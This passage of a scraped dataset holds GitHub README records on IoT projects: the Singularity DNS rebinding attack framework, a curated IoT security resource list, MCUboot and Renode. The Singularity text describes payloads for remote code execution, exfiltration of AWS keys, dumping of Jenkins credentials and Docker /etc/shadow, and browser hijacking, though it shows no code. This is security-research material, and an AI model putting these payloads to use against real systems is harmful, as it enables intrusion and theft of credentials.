addresses and retrieve the balance of the first eth address.\nRails Console RCE (rails-console-rce.js): Performs a remote code execution (RCE) attack on the Rails Web Console.\nAWS Metadata Exfil (aws-metadata-exfil.js): Forces a headless browser to exfiltrate AWS metadata including private keys to a given host. Check the payload contents for additional details on how to setup the attack.\nDuplicati RCE (duplicati-rce.js): This payload exploits the Duplicati backup client and performs a remote code execution (RCE) attack. For this attack to work, parameter targetURL in file payload-duplicati-rce.html must be updated to point to a valid Duplicati backup containing the actual RCE payload, a shell script.\nWebPDB (webpdb.js): A generic RCE payload to exploit PDB, a python debugger exposed via websockets.\nHook and Control (hook-and-control.js): Hijack target browsers and use them to access inaccessible resources from your own browser or other HTTP clients. You can retrieve the list of hooked browsers on the \"soohooked\" sub-domain of the Singularity manager host on port 3129 by default e.g. http://soohooked.rebinder.your.domain:3129/. To authenticate, submit the secret value dumped to the console by the Singularity server at startup.\nJenkins Script Console (jenkins-script-console.js): This payload exploits the Jenkins Script Console and displays the stored credentials.\nDocker API (docker-api.js): This payload exploits the Docker API and displays the /etc/shadow file of the Docker host.", "link": "https://github.com/nccgroup/singularity", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "singularity of origin\nnew (2020-03-30): new blog post investigating the impact of doh on dns rebinding attacks. tl;dr: doh (dns over https) has no effect on rebinding attacks and protections advertised by providers can be bypassed.\nnew! the webrtc leak, which permitted to obtain the internal ip address of a target machine has been fixed in recent version of google chrome and apple safari. it still works on firefox.\nnew! check out our def con 27 video and bsideslv presentation at state of dns rebinding: attack & prevention techniques and the singularity of origin\nsingularity of origin is a -----> tool !!!  to perform dns rebinding attacks. it includes the necessary components to rebind the ip address of the attack server dns name to the target machine's ip address and to serve attack payloads to exploit vulnerable software on the target machine.\nit also ships with sample payloads to exploit several vulnerable software versions, from the simple capture of a home page to performing remote code execution. it aims at providing a framework to facilitate the exploitation of software vulnerable to dns rebinding attacks and to raise awareness on how they work and how to protect from them.\ndetailed documentation is on the wiki pages.\ncore features\nsingularity provides a complete dns rebinding attack delivery stack:\ncustom dns server to rebind dns name and ip address\nhttp server (manager web interface) to serve html pages and javascript code to targets and to manage the attacks\nseveral sample attack payloads, ranging from grabbing the home page of a target application to performing remote code execution. these payloads can be easily adapted to perform new and custom attacks.\nsupports dns cname values in target specification in addition to ip addresses to evade dns filtering solutions or to target internal resources for which the ip address is unknown.\na simple, fast and efficient http port scanner to identify vulnerable services.\nattack automation allows to completely automate the scanning and exploitation of vulnerable services on a network.\nhook and control permits using victim web browsers as http proxies to access internal network resources, to interactively explore and exploit otherwise inaccessible applications with your own browser.\nsingularity manager interface\nhook and control a vulnerable application on localhost or other hosts\nautomate the scan and compromise of all vulnerables applications\nusage\nsetting up singularity requires a dns domain name where you can edit your own dns records for your domain and a linux server to run it. please see the setup singularity wiki page for detailed instructions.\nthe documentation is on the wiki pages. here are a few pointers to start:\nwhat are dns rebinding attacks?\npreventing dns rebinding attacks\nsetup and installation\ndescription of existing payloads and how to write your own\na test instance is available for demo purposes at http://rebind.it:8080/manager.html.\nspeed\nsingularity has been tested to work with the following browsers in optimal conditions in under 3 seconds:\nbrowser operating system time to exploit rebinding strategy fetch interval target specification\nchrome windows 10 ~3s multiple answers (fast) 1s 127.0.0.1\nedge windows 10 ~3s multiple answers (fast) 1s 127.0.0.1\nfirefox windows 10 ~3s multiple answers (fast) 1s 127.0.0.1\nchromium ubuntu ~3s multiple answers (fast) 1s 0.0.0.0\nfirefox ubuntu ~3s multiple answers (fast) 1s 0.0.0.0\nchrome macos ~3s multiple answers (fast) 1s 0.0.0.0\nfirefox macos ~3s multiple answers (fast) 1s 0.0.0.0\nsafari macos ~3s multiple answers (fast) 1s 0.0.0.0\npayloads description\nsingularity supports the following attack payloads:\nbasic fetch request (simple-fetch-get.js): this sample payload makes a get request to the root directory ('/') and shows the server response using the fetch api. the goal of this payload is to function as example request to make additional contributions as easy as possible.\nautomatic: this payload automatically attempts to detect known services and exploit them using other payloads listed in this section or that were developed and added to singularity by users.\nchrome devtools rce (exposed-chrome-devtools.js): this payload demonstrates a remote code execution (rce) vulnerability in microsoft vs code fixed in version 1.19.3. this payload can be adapted to exploit any software that exposes chrome dev tools on localhost.\netcd k/v dump (etcd.js): this payload retrieves the keys and values from the etcd key-value store.\npyethapp (pyethapp.js): exploits the python implementation of the ethereum client pyethapp to get the list of owned eth addresses and retrieve the balance of the first eth address.\nrails console rce (rails-console-rce.js): performs a remote code execution (rce) attack on the rails web console.\naws metadata exfil (aws-metadata-exfil.js): forces a headless browser to exfiltrate aws metadata including private keys to a given host. check the payload contents for additional details on how to setup the attack.\nduplicati rce (duplicati-rce.js): this payload exploits the duplicati backup client and performs a remote code execution (rce) attack. for this attack to work, parameter targeturl in file payload-duplicati-rce.html must be updated to point to a valid duplicati backup containing the actual rce payload, a shell script.\nwebpdb (webpdb.js): a generic rce payload to exploit pdb, a python debugger exposed via websockets.\nhook and control (hook-and-control.js): hijack target browsers and use them to access inaccessible resources from your own browser or other http clients. you can retrieve the list of hooked browsers on the \"soohooked\" sub-domain of the singularity manager host on port 3129 by default e.g. http://soohooked.rebinder.your.domain:3129/. to authenticate, submit the secret value dumped to the console by the singularity server at startup.\njenkins script console (jenkins-script-console.js): this payload exploits the jenkins script console and displays the stored credentials.\ndocker api (docker-api.js): this payload exploits the docker api and displays the /etc/shadow file of the docker host.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000146, "year": null}, {"Unnamed: 0": 151, "autor": 151, "date": null, "content": "Awesome Embedded and IoT Security\nA curated list of awesome resources about embedded and IoT security. The list contains software and hardware tools, books, research papers and more.\nBotnets like Mirai have proven that there is a need for more security in embedded and IoT devices. This list shall help beginners and experts to find helpful resources on the topic.\nIf you are a beginner, you should have a look at the Books and Case Studies sections.\nIf you want to start right away with your own analysis, you should give the Analysis Frameworks a try. They are easy to use and you do not need to be an expert to get first meaningful results.\nItems marked with \ud83d\udcb6 are comercial products.\nContents\nSoftware Tools\nAnalysis Frameworks\nAnalysis Tools\nExtraction Tools\nSupport Tools\nMisc Tools\nHardware Tools\nBluetooth BLE Tools\nZigBee Tools\nSDR Tools\nRFID NFC Tools\nBooks\nResearch Papers\nCase Studies\nFree Training\nWebsites\nBlogs\nTutorials and Technical Background\nConferences\nContribute\nLicense\nSoftware Tools\nSoftware tools for analyzing embedded/IoT devices and firmware.\nAnalysis Frameworks\nEXPLIoT - Pentest framework like Metasploit but specialized for IoT.\nFACT - The Firmware Analysis and Comparison Tool - Full-featured static analysis framework including extraction of firmware, analysis utilizing different plug-ins and comparison of different firmware versions.\nImproving your firmware security analysis process with FACT - Conference talk about FACT \ud83d\udcfa.\nFwAnalyzer - Analyze security of firmware based on customized rules. Intended as additional step in DevSecOps, similar to CI.\nHAL \u2013 The Hardware Analyzer - A comprehensive reverse engineering and manipulation framework for gate-level netlists.\nHomePWN - Swiss Army Knife for Pentesting of IoT Devices.\nIoTSecFuzz - Framework for automatisation of IoT layers security analysis: hardware, software and communication.\nKillerbee - Framework for Testing & Auditing ZigBee and IEEE 802.15.4 Networks.\nPRET - Printer Exploitation Toolkit.\nRoutersploit - Framework dedicated to exploit embedded devices.\nAnalysis Tools\nBinwalk - Searches a binary for \"interesting\" stuff, as well as extracts arbitrary files.\nemba - Analyze Linux-based firmware of embedded devices.\nFirmadyne - Tries to emulate and pentest a firmware.\nFirmwalker - Searches extracted firmware images for interesting files and information.\nFirmware Slap - Discovering vulnerabilities in firmware through concolic analysis and function clustering.\nGhidra - Software Reverse Engineering suite; handles arbitrary binaries, if you provide CPU architecture and endianness of the binary.\nRadare2 - Software Reverse Engineering framework, also handles popular formats and arbitrary binaries, has an extensive command line toolset.\nTrommel - Searches extracted firmware images for interesting files and information.\nExtraction Tools\nFACT Extractor - Detects container format automatically and executes the corresponding extraction tool.\nFirmware Mod Kit - Extraction tools for several container formats.\nThe SRecord package - Collection of tools for manipulating EPROM files (can convert lots of binary formats).\nSupport Tools\nJTAGenum - Add JTAG capabilities to an Arduino.\nOpenOCD - Free and Open On-Chip Debugging, In-System Programming and Boundary-Scan Testing.\nMisc Tools\nCotopaxi - Set of tools for security testing of Internet of Things devices using specific network IoT protocols.\ndumpflash - Low-level NAND Flash dump and parsing utility.\nflashrom - Tool for detecting, reading, writing, verifying and erasing flash chips.\nSamsung Firmware Magic - Decrypt Samsung SSD firmware updates.\nHardware Tools\nBus Blaster - Detects and interacts with hardware debug ports like UART and JTAG.\nBus Pirate - Detects and interacts with hardware debug ports like UART and JTAG.\nShikra - Detects and interacts with hardware debug ports like UART and JTAG. Among other protocols.\nJTAGULATOR - Detects JTAG Pinouts fast.\nSaleae - Easy to use Logic Analyzer that support many protocols \ud83d\udcb6.\nIkalogic - Alternative to Saleae logic analyzers \ud83d\udcb6.\nHydraBus - Open source multi-tool hardware similar to the BusPirate but with NFC capabilities.\nChipWhisperer - Detects Glitch/Side-channel attacks.\nGlasgow - Tool for exploring and debugging different digital interfaces.\nJ-Link - J-Link offers USB powered JTAG debug probes for multiple different CPU cores \ud83d\udcb6.\nBluetooth BLE Tools\nUberTooth One - Open source 2.4 GHz wireless development platform suitable for Bluetooth experimentation.\nBluefruit LE Sniffer - Easy to use Bluetooth Low Energy sniffer.\nZigBee Tools\nApiMote - ZigBee security research hardware for learning about and evaluating the security of IEEE 802.15.4/ZigBee systems. Killerbee compatible.\nAtmel RZUSBstick - Discontinued product. Lucky if you have one! - Tool for development, debugging and demonstration of a wide range of low power wireless applications including IEEE 802.15.4, 6LoWPAN, and ZigBee networks. Killerbee compatible.\nFreakduino - Low Cost Battery Operated Wireless Arduino Board that can be turned into a IEEE 802.15.4 protocol sniffer.\nSDR Tools\nRTL-SDR - Cheapest SDR for beginners. It is a computer based radio scanner for receiving live radio signals frequencies from 500 kHz up to 1.75 GHz.\nHackRF One - Software Defined Radio peripheral capable of transmission or reception of radio signals from 1 MHz to 6 GHz (half-duplex).\nYardStick One - Half-duplex sub-1 GHz wireless transceiver.\nLimeSDR - Software Defined Radio peripheral capable of transmission or reception of radio signals from 100 KHz to 3.8 GHz (full-duplex).\nBladeRF 2.0 - Software Defined Radio peripheral capable of transmission or reception of radio signals from 47 MHz to 6 GHz (full-duplex).\nUSRP B Series - Software Defined Radio peripheral capable of transmission or reception of radio signals from 70 MHz to 6 GHz (full-duplex).\nRFID NFC Tools\nProxmark 3 RDV4 - Powerful general purpose RFID tool. From Low Frequency (125kHz) to High Frequency (13.56MHz) tags.\nChamaleonMini - Programmable, portable tool for NFC security analysis.\nHydraNFC - Powerful 13.56MHz RFID / NFC platform. Read / write / crack / sniff / emulate.\nBooks\n2020, Fotios Chantzis, Evangel Deirme, Ioannis Stais, Paulino Calderon, Beau Woods: Practical IoT Hacking\n2020, Jasper van Woudenberg, Colin O'Flynn: The Hardware Hacking Handbook: Breaking Embedded Security with Hardware Attacks\n2019, Yago Hansen: The Hacker's Hardware Toolkit: The best collection of hardware gadgets for Red Team hackers, Pentesters and security researchers\n2019, Aditya Gupta: The IoT Hacker's Handbook: A Practical Guide to Hacking the Internet of Things\n2018, Mark Swarup Tehranipoor: Hardware Security: A Hands-on Learning Approach\n2018, Mark Carney: Pentesting Hardware - A Practical Handbook (DRAFT)\n2018, Qing Yang, Lin Huang Inside Radio: An Attack and Defense Guide\n2017, Aditya Gupta, Aaron Guzman: IoT Penetration Testing Cookbook\n2017, Andrew Huang: The Hardware Hacker: Adventures in Making and Breaking Hardware\n2016, Craig Smith: The Car Hacker's Handbook: A Guide for the Penetration Tester\n2015, Keng Tiong Ng: The Art of PCB Reverse Engineering\n2015, Nitesh Dhanjan: Abusing the Internet of Things: Blackouts, Freakouts, and Stakeouts\n2015, Joshua Wright , Johnny Cache: Hacking Wireless Exposed\n2014, Debdeep Mukhopadhyay: Hardware Security: Design, Threats, and Safeguards\n2014, Jack Ganssle: The Firmware Handbook (Embedded Technology)\n2013, Andrew Huang: Hacking the XBOX\nResearch Papers\n2020, Oser et al: SAFER: Development and Evaluation of an IoT Device Risk Assessment Framework in a Multinational Organization\n2019, Agarwal et al: Detecting IoT Devices and How They Put Large Heterogeneous Networks at Security Risk\n2019, Almakhdhub et al: BenchIoT: A Security Benchmark for the Internet of Things\n2019, Alrawi et al: SoK: Security Evaluation of Home-Based IoT Deployments\n2019, Abbasi et al: Challenges in Designing Exploit Mitigations for Deeply Embedded Systems\n2019, Song et al: PeriScope: An Effective Probing and Fuzzing Framework for the Hardware-OS Boundary\n2018, Muench et al: What You Corrupt Is Not What You Crash: Challenges in Fuzzing Embedded Devices\n2017, O'Meara et al: Embedded Device Vulnerability Analysis Case Study Using Trommel\n2017, Jacob et al: How to Break Secure Boot on FPGA SoCs through Malicious Hardware\n2017, Costin et al: Towards Automated Classification of Firmware Images and Identification of Embedded Devices\n2016, Kammerstetter et al: Embedded Security Testing with Peripheral Device Caching and Runtime Program State Approximation\n2016, Chen et al: Towards Automated Dynamic Analysis for Linux-based Embedded Firmware\n2016, Costin et al: Automated Dynamic Firmware Analysis at Scale: A Case Study on Embedded Web Interfaces\n2015, Shoshitaishvili et al:Firmalice - Automatic Detection of Authentication Bypass Vulnerabilities in Binary Firmware\n2015, Papp et al: Embedded Systems Security: Threats, Vulnerabilities, and Attack Taxonomy\n2014, Zaddach et al: Avatar: A Framework to Support Dynamic Security Analysis of Embedded Systems' Firmwares\n2014, Alimi et al: Analysis of embedded applications by evolutionary fuzzing\n2014, Costin et al: A Large-Scale Analysis of the Security of Embedded Firmwares\n2013, Davidson et al: FIE on Firmware: Finding Vulnerabilities in Embedded Systems using Symbolic Execution\nCase Studies\nBinary Hardening in IoT products\nCracking Linksys \u201cEncryption\u201d\nDeadly Sins Of Development - Conference talk presenting several real world examples on real bad implementations \ud83d\udcfa.\nDumping firmware from a device's SPI flash with a buspirate\nHacking the DSP-W215, Again\nHacking the PS4 - Introduction to PS4's security.\nIoT Security@CERN\nMultiple vulnerabilities found in the D-link DWR-932B\nPwning the Dlink 850L routers and abusing the MyDlink Cloud protocol\nPWN Xerox Printers (...again)\nReversing Firmware With Radare\nReversing the Huawei HG533\nFree Training\nCSAW Embedded Security Challenge 2019 - CSAW 2019 Embedded Security Challenge (ESC).\nEmbedded Security CTF - Microcorruption: Embedded Security CTF.\nHardware Hacking 101 - Workshop @ BSides Munich 2019.\nIoTGoat - IoTGoat is a deliberately insecure firmware based on OpenWrt.\nRhme-2015 - First riscure Hack me hardware CTF challenge.\nRhme-2016 - Riscure Hack me 2 is a low level hardware CTF challenge.\nRhme-2017/2018 - Riscure Hack Me 3 embedded hardware CTF 2017-2018.\nWebsites\nHacking Printers Wiki - All things printer.\nOWASP Embedded Application Security Project - Development best practices and list of hardware and software tools.\nOWASP Internet of Things Project - IoT common vulnerabilities and attack surfaces.\nRouter Passwords - Default login credential database sorted by manufacturer.\nSiliconpr0n - A Wiki/Archive of all things IC reversing.\nBlogs\nRTL-SDR\n/dev/ttyS0's Embedded Device Hacking\nExploiteers\nHackaday\njcjc's Hack The World\nQuarkslab\nwrong baud\nFirmware Security\nPenTestPartners\nAttify\nPatayu\nGracefulSecurity - Hardware tag\nBlack Hills - Hardware Hacking tag\nTutorials and Technical Background\nAzeria Lab - Miscellaneous ARM related Tutorials.\nJTAG Explained - A walkthrough covering UART and JTAG bypassing a protected login shell.\nReverse Engineering Serial Ports - Detailed tutorial about how to spot debug pads on a PCB.\nUART explained - An in depth explanation of the UART protocol.\nConferences\nConferences focused on embedded and/or IoT security.\nHardwear.io\nEU, The Hague, September.\nUSA, Santa Clara, June.\nContribute\nContributions welcome! Read the contribution guidelines first.\nLicense\nTo the extent possible under law, Fraunhofer FKIE has waived all copyright and related or neighboring rights to this work.", "link": "https://github.com/fkie-cad/awesome-embedded-and-iot-security", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome embedded and iot security\na curated list of awesome resources about embedded and iot security. the list contains software and hardware tools, books, research papers and more.\nbotnets like mirai have proven that there is a need for more security in embedded and iot devices. this list shall help beginners and experts to find helpful resources on the topic.\nif you are a beginner, you should have a look at the books and case studies sections.\nif you want to start right away with your own analysis, you should give the analysis frameworks a try. they are easy to use and you do not need to be an expert to get first meaningful results.\nitems marked with \ud83d\udcb6 are comercial products.\ncontents\nsoftware tools\nanalysis frameworks\nanalysis tools\nextraction tools\nsupport tools\nmisc tools\nhardware tools\nbluetooth ble tools\nzigbee tools\nsdr tools\nrfid nfc tools\nbooks\nresearch papers\ncase studies\nfree training\nwebsites\nblogs\ntutorials and technical background\nconferences\ncontribute\nlicense\nsoftware tools\nsoftware tools for analyzing embedded/iot devices and firmware.\nanalysis frameworks\nexpliot - pentest framework like metasploit but specialized for iot.\nfact - the firmware analysis and comparison -----> tool !!!  - full-featured static analysis framework including extraction of firmware, analysis utilizing different plug-ins and comparison of different firmware versions.\nimproving your firmware security analysis process with fact - conference talk about fact \ud83d\udcfa.\nfwanalyzer - analyze security of firmware based on customized rules. intended as additional step in devsecops, similar to ci.\nhal \u2013 the hardware analyzer - a comprehensive reverse engineering and manipulation framework for gate-level netlists.\nhomepwn - swiss army knife for pentesting of iot devices.\niotsecfuzz - framework for automatisation of iot layers security analysis: hardware, software and communication.\nkillerbee - framework for testing & auditing zigbee and ieee 802.15.4 networks.\npret - printer exploitation toolkit.\nroutersploit - framework dedicated to exploit embedded devices.\nanalysis tools\nbinwalk - searches a binary for \"interesting\" stuff, as well as extracts arbitrary files.\nemba - analyze linux-based firmware of embedded devices.\nfirmadyne - tries to emulate and pentest a firmware.\nfirmwalker - searches extracted firmware images for interesting files and information.\nfirmware slap - discovering vulnerabilities in firmware through concolic analysis and function clustering.\nghidra - software reverse engineering suite; handles arbitrary binaries, if you provide cpu architecture and endianness of the binary.\nradare2 - software reverse engineering framework, also handles popular formats and arbitrary binaries, has an extensive command line toolset.\ntrommel - searches extracted firmware images for interesting files and information.\nextraction tools\nfact extractor - detects container format automatically and executes the corresponding extraction tool.\nfirmware mod kit - extraction tools for several container formats.\nthe srecord package - collection of tools for manipulating eprom files (can convert lots of binary formats).\nsupport tools\njtagenum - add jtag capabilities to an arduino.\nopenocd - free and open on-chip debugging, in-system programming and boundary-scan testing.\nmisc tools\ncotopaxi - set of tools for security testing of internet of things devices using specific network iot protocols.\ndumpflash - low-level nand flash dump and parsing utility.\nflashrom - tool for detecting, reading, writing, verifying and erasing flash chips.\nsamsung firmware magic - decrypt samsung ssd firmware updates.\nhardware tools\nbus blaster - detects and interacts with hardware debug ports like uart and jtag.\nbus pirate - detects and interacts with hardware debug ports like uart and jtag.\nshikra - detects and interacts with hardware debug ports like uart and jtag. among other protocols.\njtagulator - detects jtag pinouts fast.\nsaleae - easy to use logic analyzer that support many protocols \ud83d\udcb6.\nikalogic - alternative to saleae logic analyzers \ud83d\udcb6.\nhydrabus - open source multi-tool hardware similar to the buspirate but with nfc capabilities.\nchipwhisperer - detects glitch/side-channel attacks.\nglasgow - tool for exploring and debugging different digital interfaces.\nj-link - j-link offers usb powered jtag debug probes for multiple different cpu cores \ud83d\udcb6.\nbluetooth ble tools\nubertooth one - open source 2.4 ghz wireless development platform suitable for bluetooth experimentation.\nbluefruit le sniffer - easy to use bluetooth low energy sniffer.\nzigbee tools\napimote - zigbee security research hardware for learning about and evaluating the security of ieee 802.15.4/zigbee systems. killerbee compatible.\natmel rzusbstick - discontinued product. lucky if you have one! - tool for development, debugging and demonstration of a wide range of low power wireless applications including ieee 802.15.4, 6lowpan, and zigbee networks. killerbee compatible.\nfreakduino - low cost battery operated wireless arduino board that can be turned into a ieee 802.15.4 protocol sniffer.\nsdr tools\nrtl-sdr - cheapest sdr for beginners. it is a computer based radio scanner for receiving live radio signals frequencies from 500 khz up to 1.75 ghz.\nhackrf one - software defined radio peripheral capable of transmission or reception of radio signals from 1 mhz to 6 ghz (half-duplex).\nyardstick one - half-duplex sub-1 ghz wireless transceiver.\nlimesdr - software defined radio peripheral capable of transmission or reception of radio signals from 100 khz to 3.8 ghz (full-duplex).\nbladerf 2.0 - software defined radio peripheral capable of transmission or reception of radio signals from 47 mhz to 6 ghz (full-duplex).\nusrp b series - software defined radio peripheral capable of transmission or reception of radio signals from 70 mhz to 6 ghz (full-duplex).\nrfid nfc tools\nproxmark 3 rdv4 - powerful general purpose rfid tool. from low frequency (125khz) to high frequency (13.56mhz) tags.\nchamaleonmini - programmable, portable tool for nfc security analysis.\nhydranfc - powerful 13.56mhz rfid / nfc platform. read / write / crack / sniff / emulate.\nbooks\n2020, fotios chantzis, evangel deirme, ioannis stais, paulino calderon, beau woods: practical iot hacking\n2020, jasper van woudenberg, colin o'flynn: the hardware hacking handbook: breaking embedded security with hardware attacks\n2019, yago hansen: the hacker's hardware toolkit: the best collection of hardware gadgets for red team hackers, pentesters and security researchers\n2019, aditya gupta: the iot hacker's handbook: a practical guide to hacking the internet of things\n2018, mark swarup tehranipoor: hardware security: a hands-on learning approach\n2018, mark carney: pentesting hardware - a practical handbook (draft)\n2018, qing yang, lin huang inside radio: an attack and defense guide\n2017, aditya gupta, aaron guzman: iot penetration testing cookbook\n2017, andrew huang: the hardware hacker: adventures in making and breaking hardware\n2016, craig smith: the car hacker's handbook: a guide for the penetration tester\n2015, keng tiong ng: the art of pcb reverse engineering\n2015, nitesh dhanjan: abusing the internet of things: blackouts, freakouts, and stakeouts\n2015, joshua wright , johnny cache: hacking wireless exposed\n2014, debdeep mukhopadhyay: hardware security: design, threats, and safeguards\n2014, jack ganssle: the firmware handbook (embedded technology)\n2013, andrew huang: hacking the xbox\nresearch papers\n2020, oser et al: safer: development and evaluation of an iot device risk assessment framework in a multinational organization\n2019, agarwal et al: detecting iot devices and how they put large heterogeneous networks at security risk\n2019, almakhdhub et al: benchiot: a security benchmark for the internet of things\n2019, alrawi et al: sok: security evaluation of home-based iot deployments\n2019, abbasi et al: challenges in designing exploit mitigations for deeply embedded systems\n2019, song et al: periscope: an effective probing and fuzzing framework for the hardware-os boundary\n2018, muench et al: what you corrupt is not what you crash: challenges in fuzzing embedded devices\n2017, o'meara et al: embedded device vulnerability analysis case study using trommel\n2017, jacob et al: how to break secure boot on fpga socs through malicious hardware\n2017, costin et al: towards automated classification of firmware images and identification of embedded devices\n2016, kammerstetter et al: embedded security testing with peripheral device caching and runtime program state approximation\n2016, chen et al: towards automated dynamic analysis for linux-based embedded firmware\n2016, costin et al: automated dynamic firmware analysis at scale: a case study on embedded web interfaces\n2015, shoshitaishvili et al:firmalice - automatic detection of authentication bypass vulnerabilities in binary firmware\n2015, papp et al: embedded systems security: threats, vulnerabilities, and attack taxonomy\n2014, zaddach et al: avatar: a framework to support dynamic security analysis of embedded systems' firmwares\n2014, alimi et al: analysis of embedded applications by evolutionary fuzzing\n2014, costin et al: a large-scale analysis of the security of embedded firmwares\n2013, davidson et al: fie on firmware: finding vulnerabilities in embedded systems using symbolic execution\ncase studies\nbinary hardening in iot products\ncracking linksys \u201cencryption\u201d\ndeadly sins of development - conference talk presenting several real world examples on real bad implementations \ud83d\udcfa.\ndumping firmware from a device's spi flash with a buspirate\nhacking the dsp-w215, again\nhacking the ps4 - introduction to ps4's security.\niot security@cern\nmultiple vulnerabilities found in the d-link dwr-932b\npwning the dlink 850l routers and abusing the mydlink cloud protocol\npwn xerox printers (...again)\nreversing firmware with radare\nreversing the huawei hg533\nfree training\ncsaw embedded security challenge 2019 - csaw 2019 embedded security challenge (esc).\nembedded security ctf - microcorruption: embedded security ctf.\nhardware hacking 101 - workshop @ bsides munich 2019.\niotgoat - iotgoat is a deliberately insecure firmware based on openwrt.\nrhme-2015 - first riscure hack me hardware ctf challenge.\nrhme-2016 - riscure hack me 2 is a low level hardware ctf challenge.\nrhme-2017/2018 - riscure hack me 3 embedded hardware ctf 2017-2018.\nwebsites\nhacking printers wiki - all things printer.\nowasp embedded application security project - development best practices and list of hardware and software tools.\nowasp internet of things project - iot common vulnerabilities and attack surfaces.\nrouter passwords - default login credential database sorted by manufacturer.\nsiliconpr0n - a wiki/archive of all things ic reversing.\nblogs\nrtl-sdr\n/dev/ttys0's embedded device hacking\nexploiteers\nhackaday\njcjc's hack the world\nquarkslab\nwrong baud\nfirmware security\npentestpartners\nattify\npatayu\ngracefulsecurity - hardware tag\nblack hills - hardware hacking tag\ntutorials and technical background\nazeria lab - miscellaneous arm related tutorials.\njtag explained - a walkthrough covering uart and jtag bypassing a protected login shell.\nreverse engineering serial ports - detailed tutorial about how to spot debug pads on a pcb.\nuart explained - an in depth explanation of the uart protocol.\nconferences\nconferences focused on embedded and/or iot security.\nhardwear.io\neu, the hague, september.\nusa, santa clara, june.\ncontribute\ncontributions welcome! read the contribution guidelines first.\nlicense\nto the extent possible under law, fraunhofer fkie has waived all copyright and related or neighboring rights to this work.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000151, "year": null}, {"Unnamed: 0": 152, "autor": 152, "date": null, "content": "MCUboot\nThis is MCUboot version 1.8.0\nMCUboot is a secure bootloader for 32-bits microcontrollers. It defines a common infrastructure for the bootloader and the system flash layout on microcontroller systems, and provides a secure bootloader that enables easy software upgrade.\nMCUboot is not dependent on any specific operating system and hardware and relies on hardware porting layers from the operating system it works with. Currently, MCUboot works with the following operating systems and SoCs:\nZephyr\nApache Mynewt\nApache NuttX\nRIOT\nMbed OS\nEspressif IDF\nCypress/Infineon\nRIOT is supported only as a boot target. We will accept any new port contributed by the community once it is good enough.\nMCUboot How-tos\nSee the following pages for instructions on using MCUboot with different operating systems and SoCs:\nZephyr\nApache Mynewt\nApache NuttX\nRIOT\nMbed OS\nEspressif IDF\nCypress/Infineon\nThere are also instructions for the Simulator.\nRoadmap\nThe issues being planned and worked on are tracked using GitHub issues. To give your input, visit MCUboot GitHub Issues.\nSource files\nYou can find additional documentation on the bootloader in the source files. For more information, use the following links:\nboot/bootutil - The core of the bootloader itself.\nboot/boot_serial - Support for serial upgrade within the bootloader itself.\nboot/zephyr - Port of the bootloader to Zephyr.\nboot/mynewt - Bootloader application for Apache Mynewt.\nboot/nuttx - Bootloader application and port of MCUboot interfaces for Apache NuttX.\nboot/mbed - Port of the bootloader to Mbed OS.\nboot/espressif - Bootloader application and MCUboot port for Espressif SoCs.\nboot/cypress - Bootloader application and MCUboot port for Cypress/Infineon SoCs.\nimgtool - A tool to securely sign firmware images for booting by MCUboot.\nsim - A bootloader simulator for testing and regression.\nJoining the project\nDevelopers are welcome!\nUse the following links to join or see more about the project:\nOur developer mailing list\nOur Slack channel\nGet your invite", "link": "https://github.com/mcu-tools/mcuboot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mcuboot\nthis is mcuboot version 1.8.0\nmcuboot is a secure bootloader for 32-bits microcontrollers. it defines a common infrastructure for the bootloader and the system flash layout on microcontroller systems, and provides a secure bootloader that enables easy software upgrade.\nmcuboot is not dependent on any specific operating system and hardware and relies on hardware porting layers from the operating system it works with. currently, mcuboot works with the following operating systems and socs:\nzephyr\napache mynewt\napache nuttx\nriot\nmbed os\nespressif idf\ncypress/infineon\nriot is supported only as a boot target. we will accept any new port contributed by the community once it is good enough.\nmcuboot how-tos\nsee the following pages for instructions on using mcuboot with different operating systems and socs:\nzephyr\napache mynewt\napache nuttx\nriot\nmbed os\nespressif idf\ncypress/infineon\nthere are also instructions for the simulator.\nroadmap\nthe issues being planned and worked on are tracked using github issues. to give your input, visit mcuboot github issues.\nsource files\nyou can find additional documentation on the bootloader in the source files. for more information, use the following links:\nboot/bootutil - the core of the bootloader itself.\nboot/boot_serial - support for serial upgrade within the bootloader itself.\nboot/zephyr - port of the bootloader to zephyr.\nboot/mynewt - bootloader application for apache mynewt.\nboot/nuttx - bootloader application and port of mcuboot interfaces for apache nuttx.\nboot/mbed - port of the bootloader to mbed os.\nboot/espressif - bootloader application and mcuboot port for espressif socs.\nboot/cypress - bootloader application and mcuboot port for cypress/infineon socs.\nimgtool - a -----> tool !!!  to securely sign firmware images for booting by mcuboot.\nsim - a bootloader simulator for testing and regression.\njoining the project\ndevelopers are welcome!\nuse the following links to join or see more about the project:\nour developer mailing list\nour slack channel\nget your invite", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000152, "year": null}, {"Unnamed: 0": 155, "autor": 155, "date": null, "content": "Renode\nCopyright (c) 2010-2021 Antmicro\nWhat is Renode?\nRenode was created by Antmicro as a virtual development tool for multinode embedded networks (both wired and wireless) and is intended to enable a scalable workflow for creating effective, tested and secure IoT systems.\nWith Renode, developing, testing, debugging and simulating unmodified software for IoT devices is fast, cost-effective and reliable.\nSupported architectures include:\nARM Cortex-A and Cortex-M\nx86\nRISC-V\nSPARC\nPOWER\nWhy use Renode?\nRenode was created based on many years of experience with the development of software for embedded systems - both for gateways, on-board computers as well as sensor nodes and microcontrollers.\nTesting and developing physical embedded systems is difficult due to poor reproducibility and lack of insight into the current state of a system, especially in multinode scenarios.\nRenode addresses this issue by letting you run unmodified binaries, identical to the ones that you would normally flash onto their target hardware, on a virtual board or system of boards.\nOne important aspect of the tool is that it simulates not only CPUs but entire SoCs (including e.g. heterogeneous multicore SoCs and various peripherals) as well as the wired or wireless connections between them, which allows users to address complex scenarios and test real production software.\nInstallation\nUsing the Linux portable release\nIf you are a Linux user, the easiest way to use Renode is to download the latest linux-portable from the releases section and unpack it using:\nmkdir renode_portable\ntar xf renode-*.linux-portable.tar.gz -C renode_portable --strip-components=1\nTo use it from any location enter the created directory and add it to the system path:\ncd renode_portable\nexport PATH=\"`pwd`:$PATH\"\nFollow the 